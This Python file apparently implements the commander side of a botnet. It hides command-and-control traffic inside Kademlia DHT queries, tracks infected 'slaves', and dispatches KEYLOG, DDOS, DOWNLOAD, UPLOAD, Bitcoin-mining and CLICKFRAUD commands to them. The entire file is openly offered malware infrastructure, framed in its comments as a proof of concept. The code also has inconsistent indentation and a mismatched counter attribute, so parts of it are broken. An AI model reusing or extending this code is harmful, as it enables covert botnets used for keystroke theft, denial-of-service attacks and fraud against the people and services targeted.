from kademlia.network import Server
from twisted.protocols import basic
from twisted.internet import reactor, task, defer, stdio
from collections import deque
from twisted.python import log
import sys, hashlib, re

#custom protocol which interprets commands and then passes them to the correct location in our DHT.
#We're powering it with std input for this demo, but this could easy be powered by ssh, telnet, another kademlia network, etc
#A commander does not have to be connected to the network, bots will blindly keep querying until they have commands
#If we bootstrapped into an existing kademlia network, all of this traffic just appears as normal queries.
#All communication between commanders and bots occurs through DHT queries, they never directly communicate
class SlaveDriver(basic.LineReceiver):
    from os import linesep as delimiter
    import hashlib
    
    def __init__(self,kserver,key):
    	self.kserver = kserver #kserver is our kademlia DHT
        self.key = key #key is the hash of the secret string where new nodes announce themselves to a botmaster
        self.slaves = {} #we keep a dictionary of all our slaves' node ids, and the hash of that value
        self.count = 0 #this will be transmitted with a command to help bot differentiate between new commands
        #The commander needs to constantly check for new bots. When a commander finds a new bot, it sends an ack
        #back to a location thats unique to each node so that they know they've been found. They then look at that location
        #awaiting future commands
        self.slaveloop = task.LoopingCall(self.checknewslave) 
        self.slaveloop.start(5)
    	#self.queue = deque()

    #check DHT for new nodes, and make sure we haven't already found them
    def checknewslave(self):
        def addslave(val):
            #print "Val: ",val
            if val:
                if val not in self.slaves:
                   # print "New slave found"
                    valhash = hashlib.sha1()
                    valhash.update(str(val))
                    newval = valhash.hexdigest()
                    self.slaves[val]=newval
                    self.kserver.set(self.slaves[val], str(val))
                    #for key, value in self.slaves.iteritems():
                    #    print key, value
        self.kserver.get(self.key).addCallback(addslave)
    
    #this function will send command at the hash of bot's id
    def parsecommands(self,line):
    	tmp = line.split(' ')
    	cmd = tmp[0].upper()
        if cmd == 'KEYLOG':
        	#iterate through bot list and send command out in mass. This can be changed depending on the command
            for key,val in self.slaves.iteritems():
                output = 'Starting keylogger for bot {0}\n'.format(key)
                self.transport.write(output)
                botcmd = str(self.count) + " " + cmd
                self.kserver.set(val,botcmd)
        if cmd == 'DDOS':
        	for key,val in self.slaves.iteritems():
        		output = 'Starting DDOS for bot {0}\n'.format(key)
                self.transport.write(output)
                #actually send commands out on DHT to bot. Val is the bot's individual location it checks for commands
               	botcmd = str(self.count) + " " + line
                self.kserver.set(val,botcmd)
        if cmd == 'DOWNLOAD':
        	for key,val in self.slaves.iteritems():
        		output = 'Starting DOWNLOAD for bot {0}\n'.format(key)
                self.transport.write(output)
                botcmd = str(self.count) + " " + line
                self.kserver.set(val,botcmd)
        if cmd == 'UPLOAD':
        	for key,val in self.slaves.iteritems():
        		output = 'Starting UPLOAD for bot {0}\n'.format(key)
                self.transport.write(output)
                botcmd = str(self.count) + " " + line
                self.kserver.set(val,botcmd)
                
        if cmd == 'BITCOIN':
        	print("This feature isn't fully implemented, should work but highly insecure and slow")
        	for key,val in self.slaves.iteritems():
        		output = 'Starting BITCOIN MINING for bot {0}\n'.format(key)
                self.transport.write(output)
                botcmd = str(self.count) + " " + line
                self.kserver.set(val,botcmd)
       	if cmd == 'CLICKFRAUD':
       		for key,val in self.slaves.iteritems():
       			output = 'Starting CLICKFRAUD for bot {0}\n'.format(key)
                self.transport.write(output)
                botcmd = str(self.count) + " " + line
                self.kserver.set(val,botcmd)



    #this is called on the initial startup as part of the LineReceiver class
    def connectionMade(self):
        self.transport.write('>>> ')

    def lineReceived(self, line):
        #self.sendLine('Executing: ' + line)
        self.handlecmd(line)
        self.transport.write('>>> ')

    def handlecmd(self, line):
    	commands = ['DDOS','DOWNLOAD','UPLOAD','KEYLOG', 'BITCOIN', 'CLICKFRAUD']
    	#parse out actual command
    	tmp = line.split(' ')
    	cmd = tmp[0].upper()
    	if cmd not in commands:
    		#output to input
    		self.transport.write('Invalid Command\n')
    		self.transport.write('Valid commands are: DDOS [ip], DOWNLOAD [ip] [port] [filepath], UPLOAD [ip] [port] [filepath], BITCOING [username] [password], CLICKFRAUD [webaddress] [HTMLobjectname], KEYLOG\n')
    	else:
    		self.commands += 1
            self.parsecommands(line) #pass line for instructions that have more than one argument

if len(sys.argv) != 4:
	print "Usage: python commander.py <bootstrap ip> <bootstrap port> <commander port>"
	exit(0)

boot_ip = str(sys.argv[1])
boot_port = int(sys.argv[2])
myport = int(sys.argv[3])
#Logging is useful for debugging but it interferes with our command interface so usually comment this line out
#log.startLogging(sys.stdout)
#Server is a high level implementation of the Kademlia protocol. It's powering the DHT
kserver = Server() 
kserver.listen(myport) #UDP port we will be listening on
#need a bootstrap address to join the network. This could be any computer on the network.
kserver.bootstrap([(boot_ip,boot_port)])
#kserver.bootstrap([("192.168.56.101", 8468)]) 
key = hashlib.sha1()

#this is an arbitray key in DHT where a bot reports its existence. We have hashed it in sha1 so that it appears
#just like any other query on a kademlia network
key.update('specialstring') 
keyhash = key.hexdigest()

#the commander takes in standard input passed into our custom Slave Driver protocol which has an underlying kademlia DHT
#This could easily be changed from std input to remote input by changing what twisted factory calls our protocol. 
#we used stdin for proof of concept but the remote input would allow the botmaster to spin up a commander from any location at any time.
stdio.StandardIO(SlaveDriver(kserver,keyhash))
reactor.run()
